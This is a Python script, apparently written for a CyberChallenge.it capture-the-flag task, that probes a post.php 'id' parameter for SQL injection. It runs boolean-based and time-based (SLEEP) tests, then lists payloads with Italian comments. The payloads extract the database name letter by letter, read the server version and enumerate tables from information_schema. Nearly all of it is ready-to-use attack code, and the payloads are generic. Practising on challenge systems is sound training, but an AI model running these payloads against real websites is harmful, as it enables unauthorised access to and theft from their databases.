import requests
import time

class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = f"{host}/post.php?id="

    def inject(self, payload):
        url = self.base_url + payload
        start_time = time.time()
        response = self.sess.get(url)
        end_time = time.time()
        return response.text, end_time - start_time

def test_sqli(host):
    attacker = Inj(host)

    # Test Boolean-Based Injection
    print("[*] Testing Boolean-Based SQL Injection...")
    payload_true = "1 OR 1=1"
    payload_false = "1 OR 1=2"
    
    response_true, _ = attacker.inject(payload_true)
    response_false, _ = attacker.inject(payload_false)

    if response_true != response_false:
        print("[+] Boolean-Based SQL Injection likely possible!")
    else:
        print("[-] Boolean-Based SQL Injection doesn't seem to work.")

    # Test Time-Based Injection
    print("\n[*] Testing Time-Based SQL Injection...")
    payload_time = "1 OR SLEEP(5)"
    
    _, response_time = attacker.inject(payload_time)

    if response_time > 4:
        print("[+] Time-Based SQL Injection detected!")
    else:
        print("[-] Time-Based SQL Injection doesn't seem to work.")

# Usa l'URL del tuo target
host = "http://filtered.challs.cyberchallenge.it"
test_sqli(host)

payloads = [
    "1 OR SLEEP(5)",  # Se la risposta impiega 5 secondi, significa che l'iniezione ha funzionato
    "1 AND IF(1=1, SLEEP(5), 1)",  # Test booleano
    "1 AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 1)"  # Scopri il nome del database lettera per lettera
]

payloads = [
    "1 OR 1=1",  # Sempre vero (la pagina dovrebbe mostrare risultati validi)
    "1 OR 1=2",  # Sempre falso (la pagina potrebbe mostrare "Articolo non trovato")
    "1 OR LENGTH(database())>5",  # Verifica se il nome del database è lungo più di 5 caratteri
    "1 OR ASCII(SUBSTRING(database(),1,1))>77"  # Trova la prima lettera del database
]

payloads = [
    "1/0",  # Divisione per zero
    "1' - 1",  # Possibile errore di tipo
    "1' || (SELECT version()) -- ",  # Prova a concatenare una stringa
    "1' || (SELECT database()) -- ",  # Prova a ottenere il nome del database
    "1' || (SELECT table_name FROM information_schema.tables LIMIT 1) -- "  # Prova a ottenere un nome di tabella
]
